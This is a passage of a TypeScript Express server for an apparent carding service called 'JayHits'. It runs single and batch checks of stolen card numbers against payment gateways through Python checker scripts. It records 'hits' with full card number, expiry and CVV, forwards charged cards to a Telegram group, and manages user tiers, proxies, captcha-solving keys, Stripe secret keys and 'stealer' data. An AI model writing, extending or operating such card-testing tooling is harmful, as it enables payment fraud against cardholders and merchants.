    const { userName, userId, card, gateway, response, status, amount, currency } = req.body || {};
    if (!userName || !userId || !card || !gateway) {
      return res.status(400).json({ error: "Missing fields" });
    }
    let detail = `${response || status || "Hit"} — ${gateway}`;
    if (amount && currency) {
      try {
        const amt = parseInt(amount);
        const zeroDecimalCurrencies = ["bif","clp","djf","gnf","jpy","kmf","krw","mga","pyg","rwf","ugx","vnd","vuv","xaf","xof","xpf"];
        const cur = (currency || "").toLowerCase();
        const amtStr = zeroDecimalCurrencies.includes(cur) ? `${amt}` : `${(amt / 100).toFixed(2)}`;
        detail += ` | ${amtStr} ${(currency || "").toUpperCase()}`;
      } catch {}
    }
    const hitStatus = (status || "").toUpperCase();
    const eventType = hitStatus === "CHARGED" ? "hit" : "hit";
    addActivity({
      type: eventType,
      userName: userName || "Bot User",
      userId: String(userId),
      message: `${userName} Got Hit ⚡`,
      detail,
    });
    if (hitStatus === "CHARGED") {
      try {
        saveChargedCC(card, gateway, String(userId), userName);
      } catch {}
    }
    if (hitStatus === "CHARGED" || hitStatus === "APPROVED") {
      try {
        sendGroupLog(userName, String(userId), card, gateway, response || status);
      } catch {}
    }
    res.json({ ok: true });
  });

  app.get("/api/auth/session", (req, res) => {
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Surrogate-Control", "no-store");
    Object.defineProperty(req, "fresh", { get: () => false, configurable: true });
    if (!req.session?.userId) {
      return res.json({ authenticated: false });
    }
    if (isUserBanned(req.session.userId)) {
      req.session.destroy(() => {});
      return res.json({ authenticated: false, banned: true });
    }
    ensurePersistedUser(req.session.userId);
    const pinConfigured = !!process.env.ADMIN_PIN;
    const adminPinVerified = !pinConfigured || !!req.session.adminPinVerified;
    res.json({
      authenticated: true,
      user: {
        userId: req.session.userId,
        isAdmin: req.session.isAdmin || false,
        adminPinVerified,
        firstName: req.session.firstName || "",
        lastName: req.session.lastName || "",
        username: req.session.username || "",
        photoUrl: req.session.photoUrl || "",
      },
    });
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy(() => {
      res.json({ success: true });
    });
  });

  let cachedBotUsername: string | null = null;
  let botUsernameFetchedAt = 0;
  app.get("/api/bot/username", async (_req, res) => {
    try {
      if (cachedBotUsername && Date.now() - botUsernameFetchedAt < 5 * 60 * 1000) {
        return res.json({ username: cachedBotUsername });
      }
      const token = getConfigValue("TELEGRAM_BOT_TOKEN");
      if (!token) return res.json({ username: null });
      const resp = await fetch(`https://api.telegram.org/bot${token}/getMe`);
      const data = await resp.json() as any;
      if (data.ok && data.result?.username) {
        cachedBotUsername = data.result.username;
        botUsernameFetchedAt = Date.now();
        return res.json({ username: cachedBotUsername });
      }
      res.json({ username: null });
    } catch {
      res.json({ username: null });
    }
  });

  const membershipCache = new Map<string, { member: boolean; checkedAt: number }>();
  const MEMBERSHIP_CACHE_TTL = 24 * 60 * 60 * 1000;

  function getMembershipLinks() {
    return {
      groupLink: getConfigValue("TELEGRAM_GROUP_LINK"),
      channelLink: getConfigValue("TELEGRAM_CHANNEL_LINK"),
    };
  }

  // ── Avatar serving ─────────────────────────────────────────────────────
  // Serves locally cached Telegram profile pictures so the bot token is
  // never exposed in a URL visible to the frontend.
  app.get("/api/user/avatar/:userId", requireAuth, (req, res) => {
    const { userId } = req.params;
    // Any authenticated user may fetch an avatar (public Telegram profile pics)
    if (!/^\d{5,15}$/.test(userId)) {
      return res.status(400).json({ message: "Invalid user ID" });
    }
    const avatarPath = path.join(path.resolve(process.cwd(), "bot"), "avatars", `${userId}.jpg`);
    if (!fs.existsSync(avatarPath)) {
      return res.status(404).json({ message: "Avatar not found" });
    }
    res.setHeader("Content-Type", "image/jpeg");
    res.setHeader("Cache-Control", "public, max-age=86400"); // 24 h client cache
    return res.sendFile(avatarPath);
  });

  app.get("/api/user/membership", requireAuth, async (req, res) => {
    try {
      const userId = req.session?.userId || "";
      const { groupLink, channelLink } = getMembershipLinks();

      if (isAdminUser(userId)) {
        return res.json({ member: true, status: "admin", groupLink, channelLink });
      }

      const forceRefresh = req.query.refresh === "true";

      if (!forceRefresh) {
        const cached = membershipCache.get(userId);
        if (cached && cached.member && (Date.now() - cached.checkedAt) < MEMBERSHIP_CACHE_TTL) {
          return res.json({ member: true, status: "cached_member", groupLink, channelLink });
        }
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const checkScript = path.join(botDir, "check_member.py");
      const pythonPath = process.env.PYTHON_PATH || "python3";

      const result = await new Promise<string>((resolve, reject) => {
        execFile(pythonPath, [checkScript, userId], { timeout: 15000, cwd: botDir }, (err: any, stdout: string) => {
          if (err) reject(err);
          else resolve(stdout.trim());
        });
      });

      const parsed = JSON.parse(result);

      if (parsed.member) {
        membershipCache.set(userId, { member: true, checkedAt: Date.now() });
      } else {
        console.log(`[membership] User ${userId} check failed: ${parsed.status}`);
      }

      res.json({ member: parsed.member, status: parsed.status, groupLink, channelLink });
    } catch (err: any) {
      console.error(`[membership] Error checking user ${req.session?.userId}:`, err.message);
      const { groupLink, channelLink } = getMembershipLinks();
      membershipCache.set(req.session?.userId || "", { member: true, checkedAt: Date.now() });
      res.json({ member: true, status: "error_fallback", groupLink, channelLink });
    }
  });

  app.get("/api/stats", requireAdmin, async (_req, res) => {
    try {
      const stats = await botManager.getStats();
      res.json(stats);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/users", requireAdmin, async (_req, res) => {
    try {
      const users = await botManager.getUsers();
      res.json(users);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/gateways", requireAdmin, (_req, res) => {
    try {
      const gateways = botManager.getGateways();
      res.json(gateways);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/bot/status", requireAdmin, (_req, res) => {
    try {
      const status = botManager.getStatus();
      res.json(status);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/bot/logs", requireAdmin, (_req, res) => {
    try {
      const logs = botManager.getLogs();
      res.json(logs);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/bot/start", requireAdmin, async (_req, res) => {
    try {
      const result = await botManager.start();
      if (result.success) {
        res.json(result);
      } else {
        res.status(400).json(result);
      }
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/bot/stop", requireAdmin, async (_req, res) => {
    try {
      const result = await botManager.stop();
      if (result.success) {
        res.json(result);
      } else {
        res.status(400).json(result);
      }
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/bot/restart", requireAdmin, async (_req, res) => {
    try {
      const result = await botManager.restart();
      if (result.success) {
        res.json(result);
      } else {
        res.status(400).json(result);
      }
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/bot/logs/clear", requireAdmin, (_req, res) => {
    try {
      botManager.clearLogs();
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // ── Telegram Webhook Management ───────────────────────────────────────────
  // Derive a stable secret from the bot token so the webhook path is
  // unpredictable but deterministic across restarts.
  function getWebhookSecret(): string {
    const token = botManager.getBotEnvConfig().botToken || process.env.TELEGRAM_BOT_TOKEN || "";
    if (!token) return "";
    return crypto.createHash("sha256").update(token + "jayhits-webhook").digest("hex").slice(0, 32);
  }

  function getBotToken(): string {
    return botManager.getBotEnvConfig().botToken || process.env.TELEGRAM_BOT_TOKEN || "";
  }

  app.post("/tg-webhook/:secret", async (req, res) => {
    const secret = getWebhookSecret();
    if (!secret || req.params.secret !== secret) {
      return res.status(403).send("Forbidden");
    }

    res.sendStatus(200);

    try {
      const update = req.body as any;
      const message = update?.message;
      const text = (message?.text || "").trim();
      const from = message?.from;
      const chatId = message?.chat?.id;

      if (!message || !from || !chatId || !text) return;

      const command = text.split(/\s+/)[0].toLowerCase();
      if (!/^\/start(@[a-z0-9_]+)?$/i.test(command)) return;

      const userId = String(from.id);
      registerTelegramUser(userId);

      const firstName = from.first_name || "there";
      const botUsername = cachedBotUsername ? `@${cachedBotUsername}` : "the JayHits bot";
      const welcomeText = [
        `Welcome to JayHits, ${firstName}.`,
        "",
        `Your User ID is: ${userId}`,
        "",
        `Use this ID on the JayHits login screen to request an OTP.`,
        `After that, ${botUsername} will send the OTP here automatically.`,
      ].join("\n");

      await sendTelegramMessage(chatId, welcomeText);
    } catch (err: any) {
      console.error("[telegram-webhook] Failed to process update:", err?.message || err);
    }
  });

  // GET /api/admin/webhook/status
  app.get("/api/admin/webhook/status", requireAdmin, async (req, res) => {
    const token = getBotToken();
    if (!token) return res.status(400).json({ error: "Bot token not configured" });
    try {
      const r = await fetch(`https://api.telegram.org/bot${token}/getWebhookInfo`);
      const data = await r.json() as any;
      const info = data.result || {};
      const host = req.headers["x-forwarded-host"] || req.headers.host || "";
      const proto = req.headers["x-forwarded-proto"] || "https";
      const expectedUrl = `${proto}://${host}/tg-webhook/${getWebhookSecret()}`;
      res.json({
        url: info.url || "",
        active: !!info.url,
        ours: info.url === expectedUrl,
        pendingUpdateCount: info.pending_update_count || 0,
        lastError: info.last_error_message || null,
        expectedUrl,
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // POST /api/admin/webhook/setup
  app.post("/api/admin/webhook/setup", requireAdmin, async (req, res) => {
    const token = getBotToken();
    if (!token) return res.status(400).json({ error: "Bot token not configured" });
    const secret = getWebhookSecret();
    if (!secret) return res.status(400).json({ error: "Cannot derive webhook secret — check bot token" });
    const host = req.headers["x-forwarded-host"] || req.headers.host || "";
    const proto = req.headers["x-forwarded-proto"] || "https";
    const webhookUrl = `${proto}://${host}/tg-webhook/${secret}`;
    try {
      const r = await fetch(`https://api.telegram.org/bot${token}/setWebhook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: webhookUrl,
          max_connections: 40,
          drop_pending_updates: false,
          allowed_updates: ["message"],
        }),
      });
      const data = await r.json() as any;
      if (data.ok) {
        await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            commands: [
              {
                command: "start",
                description: "Register and get your JayHits user ID",
              },
            ],
          }),
        }).catch(() => {});
        console.log(`[webhook] Set Telegram webhook → ${webhookUrl}`);
        res.json({ success: true, url: webhookUrl });
      } else {
        res.status(400).json({ error: data.description || "Failed to set webhook" });
      }
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // POST /api/admin/webhook/remove
  app.post("/api/admin/webhook/remove", requireAdmin, async (_req, res) => {
    const token = getBotToken();
    if (!token) return res.status(400).json({ error: "Bot token not configured" });
    try {
      const r = await fetch(`https://api.telegram.org/bot${token}/deleteWebhook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ drop_pending_updates: false }),
      });
      const data = await r.json() as any;
      if (data.ok) {
        console.log("[webhook] Telegram webhook removed");
        res.json({ success: true });
      } else {
        res.status(400).json({ error: data.description || "Failed to remove webhook" });
      }
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // ── Cloudflare Admin Endpoints ────────────────────────────────────────────
  // GET /api/admin/cf/status — shows whether the current request arrived via CF
  app.get("/api/admin/cf/status", requireAdmin, (req: Request, res: Response) => {
    const cfg = getCfConfig();
    const cfConnecting = req.headers["cf-connecting-ip"];
    const cfRay = req.headers["cf-ray"];
    const cfCountry = req.headers["cf-ipcountry"];
    res.json({
      cfOnly: cfg.cfOnly,
      viaCf: !!(cfConnecting || cfRay),
      cfRay: cfRay ? (Array.isArray(cfRay) ? cfRay[0] : cfRay) : null,
      cfCountry: cfCountry ? (Array.isArray(cfCountry) ? cfCountry[0] : cfCountry) : null,
      clientIp: getClientIp(req),
      remoteIp: req.socket?.remoteAddress || null,
    });
  });

  // POST /api/admin/cf/toggle — enable or disable CF-only mode
  app.post("/api/admin/cf/toggle", requireAdmin, (req: Request, res: Response) => {
    const { cfOnly } = req.body;
    saveCfConfig({ cfOnly: !!cfOnly });
    console.log(`[cf] CF-only mode ${cfOnly ? "enabled" : "disabled"}`);
    res.json({ success: true, cfOnly: !!cfOnly });
  });

  // GET /api/admin/hitter/site-visible — get current site visibility setting for auto hitter group logs
  app.get("/api/admin/hitter/site-visible", requireAdmin, (_req, res) => {
    res.json({ siteVisible: getBooleanConfig("HITTER_SITE_VISIBLE", true) });
  });

  // POST /api/admin/hitter/site-visible — toggle site visibility in auto hitter group logs (global default)
  app.post("/api/admin/hitter/site-visible", requireAdmin, (req: Request, res: Response) => {
    try {
      const { siteVisible } = req.body;
      updateRuntimeSettings({ HITTER_SITE_VISIBLE: !!siteVisible });
      console.log(`[hitter] Site visible in group log: ${!!siteVisible}`);
      res.json({ success: true, siteVisible: !!siteVisible });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // GET /api/maintenance — public endpoint, anyone can check maintenance status
  app.get("/api/maintenance", (_req, res) => {
    res.json({ maintenance: getBooleanConfig("MAINTENANCE_MODE", false) });
  });

  // GET /api/admin/maintenance
  app.get("/api/admin/maintenance", requireAdmin, (_req, res) => {
    res.json({ maintenance: getBooleanConfig("MAINTENANCE_MODE", false) });
  });

  // POST /api/admin/maintenance
  app.post("/api/admin/maintenance", requireAdmin, (req: Request, res: Response) => {
    try {
      const { maintenance } = req.body;
      updateRuntimeSettings({ MAINTENANCE_MODE: !!maintenance });
      console.log(`[maintenance] Maintenance mode: ${!!maintenance}`);
      res.json({ success: true, maintenance: !!maintenance });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // POST /api/admin/export-snapshot — force-save all JSON files and return snapshot
  app.post("/api/admin/export-snapshot", requireAdmin, async (_req, res) => {
    try {
      // Fire-and-forget DB save — don't block the response waiting for it
      saveAllJsonFiles().catch(() => {});
      const BOT_DIR = path.join(process.cwd(), "bot");
      const ALL_FILES = [
        "admin_sites.json","banned_users.json","bot_settings.json","charged_ccs.json",
        "runtime-settings.json","daily_usage.json","found_gates.json","free_users.json",
        "gateway_status.json","hitter_history.json","keys.json","pk_config.json",
        "premium.json","razorpay_config.json","referrals.json","saved_bins.json",
        "skool_accounts.json","skool_status.json","pending_stealer.json","user_hitter_prefs.json",
        "user_proxies.json","user_sk_keys.json","user_sites.json","user_skool_accounts.json",
        "user_tiers.json","users.json",
      ];
      const snapshot: Record<string, any> = {
        exported_at: new Date().toISOString(),
        source: "JayHits Dashboard",
        files: {},
      };
      for (const filename of ALL_FILES) {
        const fp = path.join(BOT_DIR, filename);
        if (!fs.existsSync(fp)) { snapshot.files[filename] = null; continue; }
        try { snapshot.files[filename] = JSON.parse(fs.readFileSync(fp, "utf-8")); }
        catch { snapshot.files[filename] = null; }
      }
      res.setHeader("Content-Disposition", `attachment; filename="data_snapshot_${Date.now()}.json"`);
      res.setHeader("Content-Type", "application/json");
      res.json(snapshot);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // GET /api/user/hitter/site-visible — get this user's own site visibility preference
  app.get("/api/user/hitter/site-visible", requireAuth, (req, res) => {
    try {
      const userId = req.session!.userId;
      const siteVisible = getUserSiteVisible(userId);
      res.json({ siteVisible });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // POST /api/user/hitter/site-visible — save this user's own site visibility preference
  app.post("/api/user/hitter/site-visible", requireAuth, (req, res) => {
    try {
      const userId = req.session!.userId;
      const { siteVisible } = req.body;
      const prefs = getUserHitterPrefs();
      prefs[userId] = { hide_site: !siteVisible };
      saveUserHitterPrefs(prefs);
      res.json({ success: true, siteVisible: !!siteVisible });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/bot/config", requireAdmin, (_req, res) => {
    try {
      const config = botManager.getBotEnvConfig();
      const masked = {
        ...config,
        botToken: config.botToken ? config.botToken.slice(0, 6) + "..." + config.botToken.slice(-4) : "",
        apiHash: config.apiHash ? config.apiHash.slice(0, 4) + "..." + config.apiHash.slice(-4) : "",
      };
      res.json(masked);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.put("/api/bot/config", requireAdmin, (req, res) => {
    try {
      const { botToken, apiId, apiHash, adminId, groupId, groupLink, channelLink } = req.body;
      const updates: Record<string, string> = {};
      if (botToken !== undefined) updates.TELEGRAM_BOT_TOKEN = botToken;
      if (apiId !== undefined) updates.TELEGRAM_API_ID = apiId;
      if (apiHash !== undefined) updates.TELEGRAM_API_HASH = apiHash;
      if (adminId !== undefined) updates.TELEGRAM_ADMIN_ID = adminId;
      if (groupId !== undefined) updates.TELEGRAM_GROUP_ID = groupId;
      if (groupLink !== undefined) updates.TELEGRAM_GROUP_LINK = groupLink;
      if (channelLink !== undefined) updates.TELEGRAM_CHANNEL_LINK = channelLink;
      botManager.updateBotEnvConfig(updates);
      res.json({
        success: true,
        message: "Secrets are read from .env/Railway variables. Update the deployment environment and restart the bot to apply changes.",
      });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // ── Captcha API keys (NopeCHA / CaptchaAI) ──────────────────────────────
  app.get("/api/admin/captcha-keys", requireAdmin, (_req, res) => {
    res.json({
      nopechaKey: getConfigValue("NOPECHA_API_KEY"),
      captchaaiKey: getConfigValue("CAPTCHAAI_API_KEY"),
    });
  });

  app.put("/api/admin/captcha-keys", requireAdmin, (req, res) => {
    try {
      res.json({
        success: true,
        message: "Captcha keys are read from NOPECHA_API_KEY and CAPTCHAAI_API_KEY environment variables.",
      });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // ── Logs Group config ────────────────────────────────────────────────────
  app.get("/api/admin/logs-config", requireAdmin, (_req, res) => {
    res.json({ logsGroupId: getConfigValue("LOGS_GROUP_ID") });
  });

  app.put("/api/admin/logs-config", requireAdmin, (req, res) => {
    try {
      const { logsGroupId } = req.body;
      if (logsGroupId !== undefined) updateRuntimeSettings({ LOGS_GROUP_ID: String(logsGroupId).trim() });
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/bot/settings", requireAdmin, (_req, res) => {
    try {
      const settings = botManager.getBotSettings();
      res.json(settings);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.put("/api/bot/settings", requireAdmin, (req, res) => {
    try {
      const current = botManager.getBotSettings();
      const { mass_check_enabled, inline_mass_limit, file_mass_limit } = req.body;
      if (mass_check_enabled !== undefined) current.mass_check_enabled = mass_check_enabled;
      if (inline_mass_limit !== undefined) { const v = Number(inline_mass_limit); if (!isNaN(v)) current.inline_mass_limit = Math.max(1, Math.min(100, v)); }
      if (file_mass_limit !== undefined) { const v = Number(file_mass_limit); if (!isNaN(v)) current.file_mass_limit = Math.max(1, Math.min(10000, v)); }
      botManager.saveBotSettings(current);
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.patch("/api/gateways/:id", requireAdmin, (req, res) => {
    try {
      const { id } = req.params;
      const { enabled, premium_only } = req.body;
      botManager.updateGatewaySettings(id, { enabled, premium_only });
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/tools", requireAdmin, (_req, res) => {
    try {
      const tools = botManager.getTools();
      res.json(tools);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.patch("/api/tools/:id", requireAdmin, (req, res) => {
    try {
      const { id } = req.params;
      const { enabled, premium_only } = req.body;
      botManager.updateToolSettings(id, { enabled, premium_only });
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  const chargedCcFile = path.join(path.resolve(process.cwd(), "bot"), "charged_ccs.json");

  function saveChargedCC(card: string, gateway: string, userId: string, userName: string) {
    try {
      let charged: any[] = [];
      if (fs.existsSync(chargedCcFile)) {
        try { charged = JSON.parse(fs.readFileSync(chargedCcFile, "utf-8")); } catch { charged = []; }
      }
      const parts = card.split("|");
      charged.push({
        cc: parts[0] || card,
        mm: parts[1] || "",
        yy: parts[2] || "",
        cvv: parts[3] || "",
        gateway,
        time: Date.now() / 1000,
        user_id: userId,
        user_name: userName,
      });
      fs.writeFileSync(chargedCcFile, JSON.stringify(charged, null, 2));
      debouncedSaveJson();
    } catch (err) {
      console.error("Error saving charged CC:", err);
    }
  }

  const checkRateLimit = new Map<string, number[]>();
  const MAX_CHECKS_PER_MINUTE = 10;
  let activeChecks = 0;
  const MAX_CONCURRENT_CHECKS = 5;

  app.post("/api/check", requireAuth, async (req, res) => {
    try {
      const userId = req.session?.userId || "";
      const { gateway: reqGateway } = req.body;
      const isShopifySingle = typeof reqGateway === "string" && reqGateway.toLowerCase().startsWith("shp");
      const usageTypeSingle = isShopifySingle ? "shopifyChecks" as const : "checks" as const;
      const dailyCheck = checkDailyLimit(userId, usageTypeSingle);
      if (!dailyCheck.allowed) {
        const tier = getUserTier(userId);
        return res.status(403).json({ status: "error", response: `Daily ${isShopifySingle ? "Shopify " : ""}check limit reached (${dailyCheck.limit}). Upgrade your plan for more.`, tierLimit: true, tier, used: dailyCheck.used, limit: dailyCheck.limit });
      }

      const clientIp = getClientIp(req);
      const now = Date.now();
      const timestamps = checkRateLimit.get(clientIp) || [];
      const recent = timestamps.filter(t => now - t < 60000);
      if (recent.length >= MAX_CHECKS_PER_MINUTE) {
        return res.status(429).json({ status: "error", response: "Rate limit exceeded. Max 10 checks per minute." });
      }
      recent.push(now);
      checkRateLimit.set(clientIp, recent);

      const { gateway, card } = req.body;
      if (!gateway || !card) {
        return res.status(400).json({ status: "error", response: "Missing gateway or card" });
      }

      if (typeof gateway !== "string" || gateway.length > 20 || typeof card !== "string" || card.length > 30) {
        return res.status(400).json({ status: "error", response: "Invalid input" });
      }

      const cardClean = card.trim();
      if (!/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(cardClean)) {
        return res.status(400).json({ status: "error", response: "Invalid card format. Use: CC|MM|YY|CVV" });
      }

      if (!acquireCheckSlot()) {
        return res.status(503).json({ status: "error", response: "Server busy. Try again shortly." });
      }
      const botDir = path.resolve(process.cwd(), "bot");
      const checkerScript = path.join(botDir, "web_checker.py");
      const spawnTimeout = ["auto", "autoskool"].includes(gateway) ? 130000 : 70000;

      try {
        const result = await new Promise<string>((resolve, reject) => {
          let output = "";
          let errOutput = "";
          let settled = false;
          const userId = req.session?.userId || "";
          const userIsAdmin = req.session?.isAdmin ? "true" : "false";
          const proc = spawn("python3", ["-u", checkerScript, gateway, cardClean, userId, userIsAdmin], {
            cwd: botDir,
            env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
            timeout: spawnTimeout,
          });

          const cleanup = () => {
            if (!settled && !res.writableEnded) {
              settled = true;
              try { proc.kill("SIGTERM"); } catch {}
              setTimeout(() => { try { proc.kill("SIGKILL"); } catch {} }, 2000);
              reject(new Error("Client disconnected"));
            }
          };

          req.socket?.on("close", cleanup);

          proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
          proc.stderr?.on("data", (data: Buffer) => { errOutput += data.toString(); });

          proc.on("close", (code) => {
            if (settled) return;
            settled = true;
            req.socket?.removeListener("close", cleanup);
            if (code === 0 && output.trim()) {
              resolve(output.trim());
            } else {
              reject(new Error(errOutput.slice(0, 300) || `Process exited with code ${code}`));
            }
          });

          proc.on("error", (err) => {
            if (settled) return;
            settled = true;
            req.socket?.removeListener("close", cleanup);
            reject(err);
          });
        });

        const lines = result.split("\n");
        const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
        if (!jsonLine) {
          return res.status(500).json({ status: "error", response: "Invalid checker response" });
        }
        const parsed = JSON.parse(jsonLine);
        incrementUsage(userId, usageTypeSingle);
        res.json(parsed);

        if (req.session?.userId) {
          const responseStr = parsed.response || parsed.status || "";
          const responseLower = responseStr.toLowerCase();
          const isHit = parsed.status === "charged" || responseLower.includes("insufficient") || responseLower.includes("insuff");
          const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || req.session.userId;

          if (parsed.status === "charged") {
            const forwardScript = path.join(botDir, "web_forward_hit.py");
            const fwProc = spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, gateway, parsed.response || "Charged", userName], {
              cwd: botDir,
              env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
              timeout: 15000,
            });
            fwProc.on("error", () => {});
          }

          if (isHit) {
            saveChargedCC(cardClean, gateway, req.session.userId, userName);
            sendGroupLog(userName, req.session.userId, cardClean, gateway, responseStr, "checker");
            addActivity({
              type: "hit",
              userName,
              userId: req.session.userId,
              message: `${userName} Got Hit ⚡`,
              detail: `${parsed.status === "charged" ? "Charged" : "Insufficient Funds"} — ${gateway.toUpperCase()}`,
            });
          }
        }
      } finally {
        releaseCheckSlot();
      }
    } catch (err: any) {
      res.status(500).json({ status: "error", response: err.message?.slice(0, 200) || "Check failed" });
    }
  });

  interface JobResult {
    id: string;
    card: string;
    status: string;
    response: string;
    timestamp: number;
  }

  interface CheckJob {
    id: string;
    userId: string;
    userName: string;
    isAdmin: boolean;
    gateway: string;
    cards: string[];
    results: JobResult[];
    status: "running" | "completed" | "stopped";
    totalCards: number;
    processedCards: number;
    createdAt: number;
    completedAt?: number;
    aborted: boolean;
    workers: number;
  }

  const checkJobs = new Map<string, CheckJob>();
  const JOB_MAX_CARDS = 500;
  const JOB_WORKERS = 3;
  const JOB_EXPIRY_MS = 2 * 60 * 60 * 1000;

  setInterval(() => {
    const now = Date.now();
    for (const [id, job] of checkJobs) {
      if (job.status !== "running" && now - (job.completedAt || job.createdAt) > JOB_EXPIRY_MS) {
        checkJobs.delete(id);
      }
    }
  }, 5 * 60 * 1000);

  async function runCardCheck(gateway: string, card: string, userId: string, isAdmin: boolean): Promise<{ status: string; response: string }> {
    const botDir = path.resolve(process.cwd(), "bot");
    const checkerScript = path.join(botDir, "web_checker.py");
    const spawnTimeout = ["auto", "autoskool"].includes(gateway) ? 130000 : 70000;

    return new Promise((resolve, reject) => {
      let output = "";
      let errOutput = "";
      let settled = false;

      const proc = spawn("python3", ["-u", checkerScript, gateway, card, userId, isAdmin ? "true" : "false"], {
        cwd: botDir,
        env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
        timeout: spawnTimeout,
      });

      proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
      proc.stderr?.on("data", (data: Buffer) => { errOutput += data.toString(); });

      proc.on("close", (code) => {
        if (settled) return;
        settled = true;
        if (code === 0 && output.trim()) {
          const lines = output.trim().split("\n");
          const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
          if (jsonLine) {
            try {
              resolve(JSON.parse(jsonLine));
            } catch {
              reject(new Error("Invalid JSON from checker"));
            }
          } else {
            reject(new Error("No JSON output"));
          }
        } else {
          reject(new Error(errOutput.slice(0, 200) || `Exit code ${code}`));
        }
      });

      proc.on("error", (err) => {
        if (settled) return;
        settled = true;
        reject(err);
      });
    });
  }

  function acquireCheckSlot(): boolean {
    if (activeChecks >= MAX_CONCURRENT_CHECKS) return false;
    activeChecks++;
    return true;
  }

  function releaseCheckSlot() {
    activeChecks = Math.max(0, activeChecks - 1);
  }

  async function processJob(job: CheckJob) {
    let nextIdx = 0;

    const worker = async () => {
      while (!job.aborted) {
        const i = nextIdx++;
        if (i >= job.cards.length) break;

        while (!acquireCheckSlot()) {
          if (job.aborted) return;
          await new Promise(r => setTimeout(r, 2000));
        }

        if (job.aborted) {
          releaseCheckSlot();
          return;
        }

        const card = job.cards[i];
        const resultId = `${job.id}-${i}`;

        try {
          const result = await runCardCheck(job.gateway, card, job.userId, job.isAdmin);
          job.results.push({
            id: resultId,
            card,
            status: result.status || "unknown",
            response: result.response || "",
            timestamp: Date.now(),
          });

          const resultResponse = result.response || result.status || "";
          const resultLower = resultResponse.toLowerCase();
          const isBatchHit = result.status === "charged" || resultLower.includes("insufficient") || resultLower.includes("insuff");

          if (result.status === "charged") {
            const botDir = path.resolve(process.cwd(), "bot");
            const forwardScript = path.join(botDir, "web_forward_hit.py");
            const fwProc = spawn("python3", ["-u", forwardScript, job.userId, card, job.gateway, result.response || "Charged", job.userName || job.userId], {
              cwd: botDir,
              env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
              timeout: 15000,
            });
            fwProc.on("error", () => {});
          }

          if (isBatchHit) {
            saveChargedCC(card, job.gateway, job.userId, job.userName);
            sendGroupLog(job.userName || job.userId, job.userId, card, job.gateway, resultResponse, "auto_hitter");
            addActivity({
              type: "hit",
              userName: job.userName,
              userId: job.userId,
              message: `${job.userName} Got Hit ⚡`,
              detail: `${result.status === "charged" ? "Charged" : "Insufficient Funds"} — ${job.gateway.toUpperCase()}`,
            });
          }
        } catch (err: any) {
          job.results.push({
            id: resultId,
            card,
            status: "error",
            response: err.message?.slice(0, 200) || "Check failed",
            timestamp: Date.now(),
          });
        } finally {
          releaseCheckSlot();
          job.processedCards++;
        }
      }
    };

    const workers = Array.from(
      { length: Math.min(job.workers || JOB_WORKERS, job.cards.length) },
      () => worker()
    );
    await Promise.all(workers);

    job.status = job.aborted ? "stopped" : "completed";
    job.completedAt = Date.now();
  }

  app.post("/api/check/batch", requireAuth, (req, res) => {
    try {
      const { gateway, cards } = req.body;
      const userId = req.session?.userId || "";

      if (!gateway || !cards || !Array.isArray(cards) || cards.length === 0) {
        return res.status(400).json({ error: "Missing gateway or cards array" });
      }

      const validCards = cards
        .map((c: string) => (typeof c === "string" ? c.trim() : ""))
        .filter((c: string) => /^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(c));

      if (validCards.length === 0) {
